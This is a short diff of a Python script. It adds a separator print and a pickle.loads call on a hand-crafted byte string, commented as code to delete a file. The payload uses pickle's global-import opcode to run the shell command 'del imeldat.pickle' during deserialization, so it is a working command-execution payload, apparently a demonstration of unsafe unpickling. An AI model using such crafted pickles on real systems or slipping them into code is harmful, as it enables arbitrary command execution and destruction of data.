@@ -57,6 +57,11 @@ print('=' * 40)
 
 print(x)
 
+print('=' * 40)
+
+# code to delete a file.
+pickle.loads(b"cos\nsystem\n(S'del imeldat.pickle'\ntR.")
+
 
 
 
